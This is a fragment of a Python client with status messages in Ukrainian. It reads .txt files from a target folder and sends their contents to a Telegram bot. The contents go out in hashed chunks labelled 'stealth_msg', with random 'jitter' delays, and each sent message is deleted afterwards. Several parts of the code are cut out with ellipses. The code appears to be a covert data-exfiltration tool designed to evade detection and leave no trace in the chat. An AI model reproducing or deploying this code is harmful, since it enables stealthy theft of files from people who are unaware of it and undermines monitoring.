...
async def main_loop(client, public_key):
    print("[+] Клієнт запущено. Режим Chunking + Jitter + SHA-256.")
    ...
    while True:
        ...
        for filename in os.listdir(TARGET_FOLDER):
            if filename.endswith(".txt"):
                ...
                print(f"[*] SHA-256 файлу: {file_hash}")
                ...
                for idx, chunk in enumerate(parts):
                    stealth_msg = f"DATA_CHUNK|{file_id}|{idx}|{total_parts}|{file_hash}|{chunk}"
                    success = False
                    
                    while not success:
                        try:
                            sent_msg = await client.send_message(BOT_USERNAME, stealth_msg)
                            sleep_time_read = random.uniform(1.0, 2.5)
                            print(f"[>] Відправлено {idx+1}/{total_parts}. Пауза {sleep_time_read:.1f}с...")                           
                            await asyncio.sleep(sleep_time_read)
                            await sent_msg.delete() 
                            sleep_time_next = random.uniform(1.5, 3.5)
                            await asyncio.sleep(sleep_time_next)                         
                            success = True                          
